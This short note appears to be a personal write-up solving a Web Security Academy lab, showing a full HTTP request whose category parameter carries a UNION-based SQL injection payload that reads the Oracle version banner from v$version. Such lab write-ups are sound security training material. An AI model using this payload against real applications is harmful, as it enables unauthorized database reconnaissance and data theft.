---
tags:
  - sqli
  - oracle
---
## SQL injection attack, querying the database type and version on Oracle

1. Select a category in the web UI and note the request 
2. Send the following request to get the banner and solve the lab

```
GET /filter?category=Gifts'%20UNION%20SELECT%20banner,null%20FROM%20v$version-- HTTP/2
Host: 0a1f00d603e789b680603fdc00c50013.web-security-academy.net
Cookie: session=E1ljg5KjhFV33kG7kGgW8vuCY2lDzxLe
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a1f00d603e789b680603fdc00c50013.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```